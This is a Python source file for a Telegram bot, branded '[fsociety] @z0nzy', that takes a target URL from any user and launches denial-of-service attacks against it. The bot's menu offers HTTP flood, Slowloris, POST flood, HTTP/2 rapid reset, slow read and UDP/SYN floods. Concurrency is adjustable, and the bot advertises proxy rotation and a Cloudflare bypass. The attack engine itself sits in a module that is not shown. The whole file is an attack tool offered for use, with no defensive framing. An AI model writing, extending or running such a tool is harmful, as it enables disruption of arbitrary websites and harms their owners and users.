import asyncio
import logging
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from attacks import DDoSEngine

TOKEN = "YOUR_BOT_TOKEN_HERE"

attacks = {}

MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔥 HTTP Flood", callback_data='http'),
     InlineKeyboardButton("🐌 Slowloris", callback_data='slow')],
    [InlineKeyboardButton("📦 POST Flood", callback_data='post'),
     InlineKeyboardButton("⚡ HTTP/2 Reset", callback_data='http2')],
    [InlineKeyboardButton("🐢 Slow Read", callback_data='read'),
     InlineKeyboardButton("🌀 MIXED (all)", callback_data='mixed')],
    [InlineKeyboardButton("💀 UDP + SYN (brutal)", callback_data='udp_syn'),
     InlineKeyboardButton("🛑 STOP", callback_data='stop')],
    [InlineKeyboardButton("⚙️ SET CONCURRENCY", callback_data='concurrency')]
])

user_concurrency = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━\n"
        "[fsociety] @z0nzy\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "💀 Telegram DDoS Bot v3.0 — Unleashed\n\n"
        "📌 send target URL:\n"
        "   https://example.com\n\n"
        "⚙️ default concurrency: 500 threads\n"
        "🌐 proxy rotation: add proxy_list.txt\n\n"
        "🔥 12 attack vectors | Cloudflare bypass | UDP/SYN\n\n"
        "━━━━━━━━━━━━━━━━━━━━",
        reply_markup=MENU
    )

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith('http'):
        url = 'https://' + url
    context.user_data['target'] = url
    await update.message.reply_text(f"🎯 target set: {url}\n\nchoose attack method ↓", reply_markup=MENU)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    target = context.user_data.get('target')
    
    if not target and query.data != 'stop':
        await query.edit_message_text("❌ send target URL first")
        return
    
    if query.data == 'stop':
        if user_id in attacks:
            attacks[user_id].stop()
            del attacks[user_id]
            await query.edit_message_text("🛑 attack stopped.")
        return
    
    if query.data == 'concurrency':
        await query.edit_message_text("send number (100-5000):\nexample: 1000")
        context.user_data['waiting_concurrency'] = True
        return
    
    concurrency = user_concurrency.get(user_id, 500)
    engine = DDoSEngine(target)
    attacks[user_id] = engine
    
    method_names = {
        'http': 'HTTP Flood',
        'slow': 'Slowloris',
        'post': 'POST Flood',
        'http2': 'HTTP/2 Rapid Reset',
        'read': 'Slow Read',
        'mixed': 'MIXED (all vectors)'
    }
    
    if query.data == 'udp_syn':
        await query.edit_message_text(f"💀 UDP+SYN FLOOD on {target}\n🔥 unlimited threads\n")
        def udp_loop():
            while engine.running:
                engine.udp_flood()
                engine.syn_flood()
        thread = threading.Thread(target=udp_loop)
        thread.daemon = True
        thread.start()
        return
    
    method = query.data
    await query.edit_message_text(f"⚔️ {method_names.get(method, method)} started\n🎯 {target}\n💪 concurrency: {concurrency}\n\n✅ bombing...")
    
    try:
        await engine.run_attack(method=method, concurrency=concurrency)
    except Exception as e:
        await query.edit_message_text(f"error: {str(e)[:100]}")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_concurrency'):
        try:
            val = int(update.message.text.strip())
            if 100 <= val <= 5000:
                user_concurrency[update.effective_user.id] = val
                await update.message.reply_text(f"✅ concurrency set to {val}")
            else:
                await update.message.reply_text("❌ 100-5000 only")
        except:
            await update.message.reply_text("❌ send a number")
        context.user_data['waiting_concurrency'] = False
        return
    
    await handle_url(update, context)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("[fsociety] @z0nzy — bot running")
    app.run_polling()

if __name__ == "__main__":
    main()